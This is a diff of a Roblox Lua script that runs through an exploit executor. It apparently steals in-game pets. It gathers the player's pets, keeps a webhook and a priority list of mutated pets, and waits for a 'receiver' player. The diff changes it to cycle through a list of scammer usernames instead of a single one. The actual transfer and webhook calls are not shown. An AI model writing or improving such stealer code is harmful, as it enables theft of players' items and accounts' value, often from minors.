@@ -278,7 +278,8 @@ getgenv().Username = {
         local pets = GetPlayerPets()
 
         local Webhook = getgenv().Webhook
-        local Username = getgenv().Username
+        for _, Username in ipairs(getgenv().Username) do
+
 
         local function isMutated(toolName)
             for key, data in pairs(PetPriorityData) do
@@ -614,16 +615,19 @@ end)
             "PUT_HERE_YOUR_BACK_UP_USERNAMES", -- PUT THEIR UR EXTRA USERNAMES
         }
 
+       local Players = game:GetService("Players")
         local receiverPlr
-        repeat
-            for _, name in ipairs(usernames) do
-                receiverPlr = Players:FindFirstChild(name) or Players:FindFirstChild(Username)
-                if receiverPlr then
-                    break
-                end
-            end
-            task.wait(1)
-        until receiverPlr
+
+repeat
+    for _, name in ipairs(getgenv().Username) do
+        receiverPlr = Players:FindFirstChild(name)
+        if receiverPlr then
+            break
+        end
+    end
+    task.wait(1)
+until receiverPlr
+
 
         local receiverChar = receiverPlr.Character or receiverPlr.CharacterAdded:Wait()
         local hum = receiverChar:WaitForChild("Humanoid")
